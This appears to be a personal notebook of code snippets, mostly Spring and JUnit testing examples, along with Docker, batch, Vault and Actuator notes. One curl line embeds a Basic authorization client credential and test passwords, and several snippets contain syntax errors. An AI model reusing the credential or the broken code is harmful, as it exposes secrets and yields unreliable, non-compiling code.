  public void testFileWriting() throws IOException {
    final File log = folder.newFile("debug.log");
    final FileWriter logWriter = new FileWriter(log);
    logWriter.append("Hello, ");
    logWriter.append("World!!!");
    logWriter.flush();
    logWriter.close();
  }

  @Test
  public void testExpectedException() throws IOException {
    thrown.expect(NullPointerException.class);
    StringUtils.toHexString(null);
  }
}
--------------------------------------------------------------------------------------------------------
@Autowired
private RestTemplate restTemplate;

private MockRestServiceServer mockServer;

@Before
public void setup() {
    this.mockServer = MockRestServiceServer.createServer(this.restTemplate);
}

@Test
public void testDefaultMethod() throws Exception {
    this.mockServer.expect(requestTo("/testApps/httpMethod"))
            .andExpect(method(HttpMethod.POST))
            .andRespond(withSuccess(HttpMethod.POST.name(), MediaType.TEXT_PLAIN));

    this.defaultChannel.send(new GenericMessage<String>("Hello"));
    Message<?> message = this.replyChannel.receive(5000);
    assertNotNull(message);
    assertEquals("POST", message.getPayload());

    this.mockServer.verify();

@Configuration
public class RestClientTestApplicationConfig {
    @Bean
    @Qualifier("httpRequestChannel")
    public MessageChannel httpRequestChannel() { return new QueueChannel(); }

    @Bean
    @Qualifier("httpReplyChannel")
    public MessageChannel httpReplyChannel() { return new QueueChannel(); }

    @Bean
    public RestTemplate restTemplate() { return new RestTemplate(); }

    @Bean
    @InboundChannelAdapter(value="httpRequestChannel", poller=@Poller(fixedDelay = "1000"))
    public MessageSource<String> httpRequestTrigger() { return new ExpressionEvaluatingMessageSource<>(new LiteralExpression(""), String.class); }

    @Bean
    @ServiceActivator(inputChannel="httpRequestChannel", poller=@Poller(fixedDelay = "1000"))
    public MessageHandler messageHandler(
        RestTemplate restTemplate,
        @Qualifier("httpReplyChannel") MessageChannel messageChannel,
        @Value("${url}") String url
    ) {
        HttpRequestExecutingMessageHandler messageHandler = new HttpRequestExecutingMessageHandler(url, restTemplate);
        messageHandler.setOutputChannel(messageChannel);
        return messageHandler;
    }
} 
--------------------------------------------------------------------------------------------------------
@ContextConfiguration
@TestExecutionListeners({
    MyCustomTestExecutionListener.class,
    ServletTestExecutionListener.class,
    DirtiesContextBeforeModesTestExecutionListener.class,
    DependencyInjectionTestExecutionListener.class,
    DirtiesContextTestExecutionListener.class,
    TransactionalTestExecutionListener.class,
    SqlScriptsTestExecutionListener.class
})
public class MyTest {
    // class body...
}
@ContextConfiguration
@TestExecutionListeners(
    listeners = MyCustomTestExecutionListener.class,
    mergeMode = MERGE_WITH_DEFAULTS
)
public class MyTest {
    // class body...
}

@RunWith(SpringRunner.class)
// ApplicationContext will be loaded from the
// static nested Config class
@ContextConfiguration 
public class OrderServiceTest {

    @Configuration
    static class Config {

        // this bean will be injected into the OrderServiceTest class
        @Bean
        public OrderService orderService() {
            OrderService orderService = new OrderServiceImpl();
            // set properties, etc.
            return orderService;
        }
    }

    @Autowired
    private OrderService orderService;

    @Test
    public void testOrderService() {
        // test the orderService
    }

}

https://docs.spring.io/spring/docs/current/spring-framework-reference/testing.html#testcontext-tel-config
--------------------------------------------------------------------------------------------------------
docker run -d --name axonserver -p 8024:8024 -p 8124:8124 axoniq/axonserver
--------------------------------------------------------------------------------------------------------
test {
    systemProperty 'java.util.logging.manager', 'org.apache.logging.log4j.jul.LogManager'
}
--------------------------------------------------------------------------------------------------------
public class SwingEdtInterceptor implements InvocationInterceptor {

    @Override
    public void interceptTestMethod(Invocation<Void> invocation,
            ReflectiveInvocationContext<Method> invocationContext,
            ExtensionContext extensionContext) throws Throwable {

        AtomicReference<Throwable> throwable = new AtomicReference<>();

        SwingUtilities.invokeAndWait(() -> {
            try {
                invocation.proceed();
            }
            catch (Throwable t) {
                throwable.set(t);
            }
        });
        Throwable t = throwable.get();
        if (t != null) {
            throw t;
        }
    }
}
--------------------------------------------------------------------------------------------------------
import static example.util.StringUtils.isPalindrome;
import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertNotNull;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.junit.jupiter.api.DynamicContainer.dynamicContainer;
import static org.junit.jupiter.api.DynamicTest.dynamicTest;

import java.util.Arrays;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;
import java.util.Random;
import java.util.function.Function;
import java.util.stream.IntStream;
import java.util.stream.Stream;

import example.util.Calculator;

import org.junit.jupiter.api.DynamicNode;
import org.junit.jupiter.api.DynamicTest;
import org.junit.jupiter.api.Tag;
import org.junit.jupiter.api.TestFactory;
import org.junit.jupiter.api.function.ThrowingConsumer;

class DynamicTestsDemo {

    private final Calculator calculator = new Calculator();

    // This will result in a JUnitException!
    @TestFactory
    List<String> dynamicTestsWithInvalidReturnType() {
        return Arrays.asList("Hello");
    }

    @TestFactory
    Collection<DynamicTest> dynamicTestsFromCollection() {
        return Arrays.asList(
            dynamicTest("1st dynamic test", () -> assertTrue(isPalindrome("madam"))),
            dynamicTest("2nd dynamic test", () -> assertEquals(4, calculator.multiply(2, 2)))
        );
    }

    @TestFactory
    Iterable<DynamicTest> dynamicTestsFromIterable() {
        return Arrays.asList(
            dynamicTest("3rd dynamic test", () -> assertTrue(isPalindrome("madam"))),
            dynamicTest("4th dynamic test", () -> assertEquals(4, calculator.multiply(2, 2)))
        );
    }

    @TestFactory
    Iterator<DynamicTest> dynamicTestsFromIterator() {
        return Arrays.asList(
            dynamicTest("5th dynamic test", () -> assertTrue(isPalindrome("madam"))),
            dynamicTest("6th dynamic test", () -> assertEquals(4, calculator.multiply(2, 2)))
        ).iterator();
    }

    @TestFactory
    DynamicTest[] dynamicTestsFromArray() {
        return new DynamicTest[] {
            dynamicTest("7th dynamic test", () -> assertTrue(isPalindrome("madam"))),
            dynamicTest("8th dynamic test", () -> assertEquals(4, calculator.multiply(2, 2)))
        };
    }

    @TestFactory
    Stream<DynamicTest> dynamicTestsFromStream() {
        return Stream.of("racecar", "radar", "mom", "dad")
            .map(text -> dynamicTest(text, () -> assertTrue(isPalindrome(text))));
    }

    @TestFactory
    Stream<DynamicTest> dynamicTestsFromIntStream() {
        // Generates tests for the first 10 even integers.
        return IntStream.iterate(0, n -> n + 2).limit(10)
            .mapToObj(n -> dynamicTest("test" + n, () -> assertTrue(n % 2 == 0)));
    }

    @TestFactory
    Stream<DynamicTest> generateRandomNumberOfTests() {

        // Generates random positive integers between 0 and 100 until
        // a number evenly divisible by 7 is encountered.
        Iterator<Integer> inputGenerator = new Iterator<Integer>() {

            Random random = new Random();
            int current;

            @Override
            public boolean hasNext() {
                current = random.nextInt(100);
                return current % 7 != 0;
            }

            @Override
            public Integer next() {
                return current;
            }
        };

        // Generates display names like: input:5, input:37, input:85, etc.
        Function<Integer, String> displayNameGenerator = (input) -> "input:" + input;

        // Executes tests based on the current input value.
        ThrowingConsumer<Integer> testExecutor = (input) -> assertTrue(input % 7 != 0);

        // Returns a stream of dynamic tests.
        return DynamicTest.stream(inputGenerator, displayNameGenerator, testExecutor);
    }

    @TestFactory
    Stream<DynamicNode> dynamicTestsWithContainers() {
        return Stream.of("A", "B", "C")
            .map(input -> dynamicContainer("Container " + input, Stream.of(
                dynamicTest("not null", () -> assertNotNull(input)),
                dynamicContainer("properties", Stream.of(
                    dynamicTest("length > 0", () -> assertTrue(input.length() > 0)),
                    dynamicTest("not empty", () -> assertFalse(input.isEmpty()))
                ))
            )));
    }

    @TestFactory
    DynamicNode dynamicNodeSingleTest() {
        return dynamicTest("'pop' is a palindrome", () -> assertTrue(isPalindrome("pop")));
    }

    @TestFactory
    DynamicNode dynamicNodeSingleContainer() {
        return dynamicContainer("palindromes",
            Stream.of("racecar", "radar", "mom", "dad")
                .map(text -> dynamicTest(text, () -> assertTrue(isPalindrome(text)))
        ));
    }

}
--------------------------------------------------------------------------------------------------------
@ParameterizedTest
@EnumSource(ChronoUnit.class)
void testWithExplicitArgumentConversion(
        @ConvertWith(ToStringArgumentConverter.class) String argument) {

    assertNotNull(ChronoUnit.valueOf(argument));
}
--------------------------------------------------------------------------------------------------------
@Configuration
@Profile("default")
public class DefaultDataConfig {

    @Bean
    public DataSource dataSource() {
        return new EmbeddedDatabaseBuilder()
            .setType(EmbeddedDatabaseType.HSQL)
            .addScript("classpath:com/bank/config/sql/schema.sql")
            .build();
    }
}

@Configuration
@Profile("production")
public class JndiDataConfig {

    @Bean(destroyMethod="")
    public DataSource dataSource() throws Exception {
        Context ctx = new InitialContext();
        return (DataSource) ctx.lookup("java:comp/env/jdbc/datasource");
    }
}

@Configuration
@Profile("dev")
public class StandaloneDataConfig {

    @Bean
    public DataSource dataSource() {
        return new EmbeddedDatabaseBuilder()
            .setType(EmbeddedDatabaseType.HSQL)
            .addScript("classpath:com/bank/config/sql/schema.sql")
            .addScript("classpath:com/bank/config/sql/test-data.sql")
            .build();
    }
}

// "dev" profile overridden with "production"
@ActiveProfiles(profiles = "production", inheritProfiles = false)
public class ProductionTransferServiceTest extends AbstractIntegrationTest {
    // test body
}
@ContextConfiguration
@TestPropertySource(properties = {"timezone = GMT", "port: 4242"}) 
public class MyIntegrationTests {
    // class body...
}

@RunWith(SpringRunner.class)
@ContextConfiguration
@WebAppConfiguration
public class SessionScopedBeanTests {

    @Autowired UserService userService;
    @Autowired MockHttpSession session;

    @Test
    public void sessionScope() throws Exception {
        session.setAttribute("theme", "blue");

        Results results = userService.processUserPreferences();
        // assert results
    }
}

@RunWith(SpringRunner.class)
@ContextConfiguration(classes = TestConfig.class)
@Transactional
public class HibernateUserRepositoryTests {

    @Autowired
    HibernateUserRepository repository;

    @Autowired
    SessionFactory sessionFactory;

    JdbcTemplate jdbcTemplate;

    @Autowired
    public void setDataSource(DataSource dataSource) {
        this.jdbcTemplate = new JdbcTemplate(dataSource);
    }

    @Test
    public void createUser() {
        // track initial state in test database:
        final int count = countRowsInTable("user");

        User user = new User(...);
        repository.save(user);

        // Manual flush is required to avoid false positive in test
        sessionFactory.getCurrentSession().flush();
        assertNumUsers(count + 1);
    }

    protected int countRowsInTable(String tableName) {
        return JdbcTestUtils.countRowsInTable(this.jdbcTemplate, tableName);
    }

    protected void assertNumUsers(int expected) {
        assertEquals("Number of rows in the [user] table.", expected, countRowsInTable("user"));
    }
}

@ContextConfiguration
@Transactional(transactionManager = "txMgr")
@Commit
public class FictitiousTransactionalTest {

    @BeforeTransaction
    void verifyInitialDatabaseState() {
        // logic to verify the initial state before a transaction is started
    }

    @Before
    public void setUpTestDataWithinTransaction() {
        // set up test data within the transaction
    }

    @Test
    // overrides the class-level @Commit setting
    @Rollback
    public void modifyDatabaseWithinTransaction() {
        // logic which uses the test data and modifies database state
    }

    @After
    public void tearDownWithinTransaction() {
        // execute "tear down" logic within the transaction
    }

    @AfterTransaction
    void verifyFinalDatabaseState() {
        // logic to verify the final state after transaction has rolled back
    }
}

@Test
public void databaseTest {
    ResourceDatabasePopulator populator = new ResourceDatabasePopulator();
    populator.addScripts(
            new ClassPathResource("test-schema.sql"),
            new ClassPathResource("test-data.sql"));
    populator.setSeparator("@@");
    populator.execute(this.dataSource);
    // execute code that uses the test schema and data
}

@SpringJUnitConfig
@Sql("/test-schema.sql")
class DatabaseTests {

    @Test
    void emptySchemaTest {
        // execute code that uses the test schema without any test data
    }

    @Test
    @Sql({"/test-schema.sql", "/test-user-data.sql"})
    void userTest {
        // execute code that uses the test schema and test data
    }
}
--------------------------------------------------------------------------------------------------------
import org.springframework.stereotype.Repository;
import ru.kacit.demo.test.server.dao.EmployeeDao;
import ru.kacit.demo.test.server.model.Employee;
import ru.kacit.demo.test.server.model.Employee_;

import javax.persistence.EntityManager;
import javax.persistence.PersistenceContext;
import javax.persistence.criteria.CriteriaBuilder;
import javax.persistence.criteria.CriteriaQuery;
import javax.persistence.criteria.Root;
import java.util.List;

/**
 * @author Serge Petunin
 *         18.03.12 0:42
 */
@Repository
public class JpaEmployeeDao implements EmployeeDao {

    @PersistenceContext
    private EntityManager em;
    
    public Employee get(Long id) {
        return em.find(Employee.class, id);
    }

    public List<Employee> list(String nameStartsWith) {
        CriteriaBuilder cb = em.getCriteriaBuilder();
        CriteriaQuery<Employee> query = cb.createQuery(Employee.class);
        Root<Employee> employeeRoot = query.from(Employee.class);
        if (nameStartsWith != null && !nameStartsWith.isEmpty()) {
            query.where(cb.like(cb.lower(employeeRoot.get(Employee_.name)), nameStartsWith.toLowerCase() + '%'));
        }
        return em.createQuery(query).getResultList();
    }
    
    public void saveOrUpdate(Employee employee) {
        if (employee.getId() == null) {
            em.persist(employee);
        } else {
            em.merge(employee);
        }
    }

    public void delete(Employee employee) {
        em.remove(employee);
    }
}
--------------------------------------------------------------------------------------------------------
@Test
@SqlGroup({
    @Sql(scripts = "/test-schema.sql", config = @SqlConfig(commentPrefix = "`")),
    @Sql("/test-user-data.sql")
)}
public void userTest {
    // execute code that uses the test schema and test data
}
--------------------------------------------------------------------------------------------------------
@echo off

start "" http://www.cnn.com
start "" http://www.abc.com
start "" http://www.msnbc.com
start "" http://www.bbc.com
start "" http://www.huffingtonpost.com
start "" http://www.aljazeera.com
start "" https://news.google.com/

@echo off

rem For each file in your folder
for %%a in (".\*") do (
rem check if the file has an extension and if it is not our script
if "%%~xa" NEQ "" if "%%~dpxa" NEQ "%~dpx0" (
rem check if extension folder exists, if not it is created
if not exist "%%~xa" mkdir "%%~xa"
rem Move the file to directory
move "%%a" "%%~dpa%%~xa\"
))
--------------------------------------------------------------------------------------------------------
import javax.persistence.EntityManager;
import javax.persistence.PersistenceContext;
import javax.persistence.criteria.CriteriaBuilder;
import javax.persistence.criteria.CriteriaQuery;

/**
 * @author Serge Petunin
 *         18.03.12 3:12
 */
public class JpaTest {
    
    @PersistenceContext
    private EntityManager em;

    protected <T> T get(Class<T> objectClass, Long id) {
        return em.find(objectClass, id);
    }

    protected <T> long count(Class<T> objectClass) {
        CriteriaBuilder cb = em.getCriteriaBuilder();
        CriteriaQuery<Long> query = cb.createQuery(Long.class);
        query.select(cb.count(query.from(objectClass)));
        return em.createQuery(query).getSingleResult();
    }
}
--------------------------------------------------------------------------------------------------------
 curl -k -d "grant_type=password&username=test&password=test" -H 
"Authorization: Basic QU01dE04MXFrdzg5ZFNFTjk2Vm0waGgwWnBNYTpzeHcxbko3c2gzdm5NVVlmUDEzVmV1bWtsbTRh, 
Content-Type: application/x-www-form-urlencoded" https://XXXXXX:8243/token
--------------------------------------------------------------------------------------------------------
# Vault
spring.cloud.vault.host=localhost
spring.cloud.vault.port=8200
spring.cloud.vault.scheme=http
spring.cloud.vault.authentication=token
spring.cloud.vault.token=
--------------------------------------------------------------------------------------------------------

import static org.junit.Assert.assertEquals;
import static org.springframework.test.web.client.ExpectedCount.once;
import static org.springframework.test.web.client.match.MockRestRequestMatchers.requestTo;
import static org.springframework.test.web.client.response.MockRestResponseCreators.withSuccess;

import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.web.client.MockRestServiceServer;
import org.springframework.web.client.RestTemplate;
import org.springframework.web.client.support.RestGatewaySupport;

import com.javacodegeeks.example.service.ExampleRestService;

@RunWith(SpringRunner.class)
@SpringBootTest
public class ExampleRestServiceTestViaRestGateway {
	
	@Autowired
	RestTemplate restTemplate;

	@Autowired
	ExampleRestService service;

	private MockRestServiceServer mockServer;

	@Before
	public void setUp() {
		RestGatewaySupport gateway = new RestGatewaySupport();
		gateway.setRestTemplate(restTemplate);
		mockServer = MockRestServiceServer.createServer(gateway);
	}
	
	@Test
	public void testGetRootResourceOnce() {
		mockServer.expect(once(), requestTo("http://localhost:8080"))
			.andRespond(withSuccess("{message : 'under construction'}", MediaType.APPLICATION_JSON));

		String result = service.getRootResource();
		System.out.println("testGetRootResourceOnce: " + result);

		mockServer.verify();
		assertEquals("{message : 'under construction'}", result);
	}
}
--------------------------------------------------------------------------------------------------------
import static org.junit.Assert.assertEquals;
 
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.HttpMethod;
import org.springframework.http.MediaType;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.web.client.MockRestServiceServer;
import org.springframework.web.client.RestTemplate;
 
import com.javacodegeeks.example.service.ExampleRestService;
 
import static org.springframework.test.web.client.match.MockRestRequestMatchers.requestTo;
import static org.springframework.test.web.client.match.MockRestRequestMatchers.method;
import static org.springframework.test.web.client.response.MockRestResponseCreators.withSuccess;
import static org.springframework.test.web.client.response.MockRestResponseCreators.withBadRequest;
import static org.springframework.test.web.client.ExpectedCount.once;
import static org.springframework.test.web.client.ExpectedCount.times;
 
@RunWith(SpringRunner.class) //SpringRunner is an alias for the SpringJUnit4ClassRunner
@SpringBootTest
public class ExampleRestServiceTest {
 
    @Autowired
    RestTemplate restTemplate;
 
    @Autowired
    ExampleRestService service;
 
    private MockRestServiceServer mockServer;
 
    @Before
    public void setUp() {
        mockServer = MockRestServiceServer.createServer(restTemplate);
    }
 
    @Test
    public void testGetRootResource() {
        mockServer.expect(requestTo("http://localhost:8080")).andRespond(withSuccess("hello", MediaType.TEXT_PLAIN));
 
        String result = service.getRootResource();
        System.out.println("testGetRootResource: " + result);
 
        mockServer.verify();
        assertEquals("hello", result);
    }
     
    @Test
    public void testGetRootResourceOnce() {
        mockServer.expect(once(), requestTo("http://localhost:8080"))
            .andRespond(withSuccess("{message : 'under construction'}", MediaType.APPLICATION_JSON));
 
        String result = service.getRootResource();
        System.out.println("testGetRootResourceOnce: " + result);
 
        mockServer.verify();
        assertEquals("{message : 'under construction'}", result);
    }
     
    @Test
    public void testGetRootResourceTimes() {
        mockServer.expect(times(2), requestTo("http://localhost:8080"))
            .andRespond(withSuccess("{message : 'under construction'}", MediaType.APPLICATION_JSON));
 
        String result = service.getRootResource();
        System.out.println("testGetRootResourceTimes: " + result);
 
        mockServer.verify(); // should fail because this test expects RestTemplate.getForObject to be called twice 
        assertEquals("{message : 'under construction'}", result);
    }
     
    @Test
    public void testAddComment() {
        mockServer.expect(requestTo("http://localhost/add-comment")).andExpect(method(HttpMethod.POST))
            .andRespond(withSuccess("{post : 'success'}", MediaType.APPLICATION_JSON));
 
        String result = service.addComment("cute puppy");
        System.out.println("testAddComment: " + result);
 
        mockServer.verify();
        assertEquals("{post : 'success'}", result);
    }
     
    @Test
    public void testAddCommentClientError() {
        mockServer.expect(requestTo("http://localhost/add-comment")).andExpect(method(HttpMethod.POST))
            .andRespond(withBadRequest());
 
        String result = service.addComment("cute puppy");
        System.out.println("testAddCommentClientError: " + result);
 
        mockServer.verify();
        assertEquals("400 Bad Request", result);
    }
     
    @Test
    public void testReset() {
        mockServer.expect(requestTo("http://localhost/add-comment")).andExpect(method(HttpMethod.POST))
            .andRespond(withSuccess("{post : 'success'}", MediaType.APPLICATION_JSON));
 
        String result = service.addComment("cute puppy");
        System.out.println("testReset 1st: " + result);
 
        mockServer.verify();
        assertEquals("{post : 'success'}", result);
         
        mockServer.reset();
         
        mockServer.expect(requestTo("http://localhost:8080")).andRespond(withSuccess("hello", MediaType.TEXT_PLAIN));
 
        result = service.getRootResource();
        System.out.println("testReset 2nd: " + result);
 
        mockServer.verify();
        assertEquals("hello", result);
    }
}

mport java.util.concurrent.ExecutionException;
 
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.util.concurrent.ListenableFuture;
import org.springframework.web.client.AsyncRestTemplate;
import org.springframework.web.client.HttpServerErrorException;
 
@Service
public class AsyncExampleRestService {
 
    @Autowired
    private AsyncRestTemplate asyncRestTemplate;
     
    public String deleteAllSuspendedUsers() {
        ListenableFuture future = asyncRestTemplate.delete("http://localhost/delete-all-suspended-users");
        // doing some long process here...
        Object result = null;
        String returnValue = "";
        try {
            result = future.get(); //The Future will return a null result upon completion.
            if (result == null) {
                returnValue = "{result:'success'}";
            } else {
                returnValue = "{result:'fail'}";
            }
        } catch (InterruptedException | ExecutionException e) {
            if (e.getCause() instanceof HttpServerErrorException) {
                returnValue = "{result: 'server error'}";
            }
        }
        System.out.println("deleteAllSuspendedUsers: " + result);
         
        return returnValue;
    }
}

import static org.junit.Assert.assertEquals;
import static org.springframework.test.web.client.match.MockRestRequestMatchers.method;
import static org.springframework.test.web.client.match.MockRestRequestMatchers.requestTo;
import static org.springframework.test.web.client.response.MockRestResponseCreators.withServerError;
 
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.HttpMethod;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.web.client.MockRestServiceServer;
import org.springframework.web.client.AsyncRestTemplate;
 
import com.javacodegeeks.example.service.AsyncExampleRestService;
 
@RunWith(SpringRunner.class)
@SpringBootTest
public class AsyncExampleRestServiceTest {
 
    @Autowired
    AsyncRestTemplate asyncRestTemplate;
 
    @Autowired
    AsyncExampleRestService service;
 
    private MockRestServiceServer mockServer;
 
    @Before
    public void setUp() {
        mockServer = MockRestServiceServer.createServer(asyncRestTemplate);
    }
 
    @Test
    public void testDeleteAllSuspendedUsers() {
        mockServer.expect(requestTo("http://localhost/delete-all-suspended-users")).andExpect(method(HttpMethod.DELETE))
            .andRespond(withServerError());
 
        String result = service.deleteAllSuspendedUsers();
        System.out.println("testDeleteAllSuspendedUsers: " + result);
 
        mockServer.verify();
        assertEquals("{result: 'server error'}", result);
    }
}
--------------------------------------------------------------------------------------------------------
 ID
	

Описание

auditevents
	

Предоставляет информацию о событиях
аудита для текущего приложения.

beans
	

Отображает полный список всех
Spring-бинов в приложении.

caches
	

Информация о кэше.

conditions
	

Показывает условия (Condition), которые
были вычислены для классов конфигурации
и автоконфигурации, и причины, по
которым они соответствовали или не
соответствовали.

configprops
	

Отображает список всех
@ConfigurationProperties

env
	

Отображает свойства из
ConfigurableEnvironment.

flyway
	

Показывает миграции баз данных
Flyway, которые были применены.

health
	

Показывает сведения о работоспособности
приложения.

httptrace
	

Отображает информацию трассировки
HTTP (по умолчанию последние 100 HTTP
запросов-ответов).

info
	

Отображает дополнительную информацию
о приложении.

integrationgraph
	

Граф Spring Integration.

loggers
	

Отображает и позволяет
изменить конфигурацию логгеров в
приложении.

liquibase
	

Показывает примененные миграции
базы данных Liquibase.

metrics
	

Показывает информацию о метриках
для текущего приложения.

mappings
	

Отображает список всех путей
@RequestMapping.

scheduledtasks
	

Отображает запланированные задачи
(scheduled tasks).

sessions
	

Позволяет извлекать и удалять
пользовательские сессии из хранилищ,
поддерживаемых Spring Session. Недоступно
при использовании Spring Session для реактивных
веб-приложений.

shutdown
	

Позволяет приложению корректно
завершить работу.

threaddump
	

Отображает информацию о потоках.

http://localhost:8086/api/env

 

http://localhost:8086/api/status

 

http://localhost:8086/api/info
--------------------------------------------------------------------------------------------------------
docker run -i -t vertx/vertx3-exec

npm install vertx3-min
npm install vertx3-full
--------------------------------------------------------------------------------------------------------
import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

@Retention(RetentionPolicy.RUNTIME)
@Target(ElementType.METHOD)
public @interface Log {
}

import ru.otus.ea.annotations.Log;
import ru.otus.ea.tolog.ITestLogging;
import ru.otus.ea.tolog.TestLogging;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;

public class IoC {
    static Set<String> annotatedMethodsSet = new HashSet<>();

    public static void setAnnotatedMethodsSet() {
        for (Method m : TestLogging.class.getDeclaredMethods()) {
            if (m.isAnnotationPresent(Log.class)) {
                annotatedMethodsSet.add(m.getName());
            }
        }
    }

    public static ITestLogging createMyClass() {

        setAnnotatedMethodsSet();

        InvocationHandler handler = new DemoInvocationHandler(new TestLogging());
        return (ITestLogging) Proxy.newProxyInstance(IoC.class.getClassLoader(),
                new Class<?>[]{ITestLogging.class}, handler);
    }

    static class DemoInvocationHandler implements InvocationHandler {
        private final ITestLogging myClass;

        DemoInvocationHandler(ITestLogging myClass) {
            this.myClass = myClass;
        }

        @Override
        public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
            if (annotatedMethodsSet.contains(method.getName())) {
                System.out.println("executed method:" + method);
                System.out.println("params:");
                Arrays.stream(args).forEach(System.out::println);
            }
            return method.invoke(myClass, args);
        }

        @Override
        public String toString() {
            return "DemoInvocationHandler{" +
                    "myClass=" + myClass +
                    '}';
        }
    }

}
--------------------------------------------------------------------------------------------------------
package com.paragon.microservices.distributor.system.configuration;

import com.fasterxml.jackson.databind.ObjectMapper;
import com.paragon.mailingcontour.commons.redis.configuration.RedisKeyspaceConfigurer;
import com.paragon.mailingcontour.commons.redis.configuration.RedisTemplateCustomizer;
import com.paragon.microservices.distributor.model.domain.Session;
import org.springframework.beans.factory.config.BeanDefinition;
import org.springframework.context.annotation.*;
import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.data.redis.core.convert.KeyspaceConfiguration;
import org.springframework.data.redis.repository.configuration.EnableRedisRepositories;
import org.springframework.data.redis.serializer.Jackson2JsonRedisSerializer;
import org.springframework.data.redis.serializer.RedisSerializer;

@Configuration
@Description("Paragon MicroServices Distributor Redis configuration")
@EnableRedisRepositories(basePackages = "com.paragon.microservices.distributor.repository")
@SuppressWarnings("unchecked")
public class RedisConfiguration {

    @Bean
    @DependsOn({"redisConnectionFactory"})
    @Description("Redis template configuration bean")
    public RedisTemplate<byte[], byte[]> redisTemplate(final RedisTemplateCustomizer<byte[], byte[]> redisTemplateCustomizer) {
        final RedisTemplate<byte[], byte[]> redisTemplate = new RedisTemplate<>();
        redisTemplateCustomizer.customize(redisTemplate);
        redisTemplate.afterPropertiesSet();
        return redisTemplate;
    }

    @Bean
    @Description("Redis session json serializer bean")
    public RedisSerializer<Session> redisSerializer(final ObjectMapper objectMapper) {
        final Jackson2JsonRedisSerializer<Session> serializer = new Jackson2JsonRedisSerializer<>(Session.class);
        serializer.setObjectMapper(objectMapper);
        return serializer;
    }

    @Bean
    @Scope(BeanDefinition.SCOPE_SINGLETON)
    @Description("Redis session keyspace configuration bean")
    public KeyspaceConfiguration sessionKeyspaceConfiguration(final RedisKeyspaceConfigurer<Session> keyspaceConfigurer) {
        return keyspaceConfigurer.configure(Session.class);
    }

//    @Bean
//    @Scope(BeanDefinition.SCOPE_SINGLETON)
//    @Description("Redis session keyspace creator bean")
//    public RedisKeyspaceCreator<Session> sessionKeyspaceCreator(final RedisSessionProperty redisSessionProperty) {
//        return () -> new RedisKeyspace<>(Session.class, redisSessionProperty.getKeySpace(), redisSessionProperty.getTimeToLive());
//    }
}
--------------------------------------------------------------------------------------------------------
org.springframework.boot.autoconfigure.EnableAutoConfiguration=\
  io.reflectoring.security.SecurityModuleConfiguration
  
META-INF/spring.factories
--------------------------------------------------------------------------------------------------------
@ConditionalOnClass(WebSecurityConfigurerAdapter.class)
@ConditionalOnMissingBean(WebSecurityConfigurerAdapter.class)
@ConditionalOnWebApplication(type = Type.SERVLET)
public class SpringBootWebSecurityConfiguration {

	@Configuration
	@Order(SecurityProperties.BASIC_AUTH_ORDER)
	static class DefaultConfigurerAdapter extends WebSecurityConfigurerAdapter {

	}

}

@RunWith ( SpringRunner.class )
@SpringBootTest ( classes = A_Simple_Application.Simple_Application.class , webEnvironment = WebEnvironment.RANDOM_PORT )
@ActiveProfiles ( "junit" )
@DirtiesContext
public class A_Simple_Application {
	final static private Logger logger = LoggerFactory.getLogger( A_Simple_Application.class );

	@BeforeClass
	// @Before
	static public void setUpBeforeClass ()
			throws Exception {

		System.out.println( "Starting logging" );
		CsapTest.initialize( logger.getName() );
	}

	@Autowired
	private ApplicationContext applicationContext;

	/**
	 * 
	 * Simple test app that excludes security autoconfiguration
	 * ManagementWebSecurityAutoConfiguration.class
	 */
	@SpringBootApplication ( exclude = {
			SecurityAutoConfiguration.class
	} )
	public static class Simple_Application {

		@RestController
		static public class Hello {

			@GetMapping ( "/hi" )
			public String hi () {
				return "Hello" +
						LocalDateTime.now()
							.format( DateTimeFormatter
								.ofPattern( "HH:mm:ss,   MMMM d  uuuu " ) );
			}

			@Inject
			ObjectMapper jsonMapper;

		}

	}

	@Test
	public void load_context () {
		logger.info( CsapTest.TC_HEAD );

		logger.info( "beans loaded: {}", applicationContext.getBeanDefinitionCount() );

		assertThat( applicationContext.getBeanDefinitionCount() )
			.as( "Spring Bean count" )
			.isGreaterThan( 200 );

		// Assert.assertFalse( true);

	}

	@LocalServerPort
	private int testPort;

	@Inject
	RestTemplateBuilder restTemplateBuilder;

	@Test
	public void http_get_hi_from_simple_app ()
			throws Exception {
		String simpleUrl = "http://localhost:" + testPort + "/hi";

		logger.info( CsapTest.TC_HEAD + "hitting url: {}", simpleUrl );
		// mock does much validation.....

		TestRestTemplate restTemplate = new TestRestTemplate( restTemplateBuilder );

		ResponseEntity<String> response = restTemplate.getForEntity( simpleUrl, String.class );

		logger.info( "result:\n" + response );

		assertThat( response.getBody() )
			.startsWith( "Hello" );
	}
}

//    @Bean
//    @Scope(BeanDefinition.SCOPE_SINGLETON)
//    @Description("Redis session keyspace creator bean")
//    public RedisKeyspaceCreator<Session> sessionKeyspaceCreator(final RedisSessionProperty redisSessionProperty) {
//        return () -> new RedisKeyspace<>(Session.class, redisSessionProperty.getKeySpace(), redisSessionProperty.getTimeToLive());
//    }
--------------------------------------------------------------------------------------------------------
@Configuration
@ConditionalOnExpression(
    "${module.enabled:true} and ${module.submodule.enabled:true}"
)
class SubModule {
  ...
}

@Configuration
@ConditionalOnResource(resources = "/logback.xml")
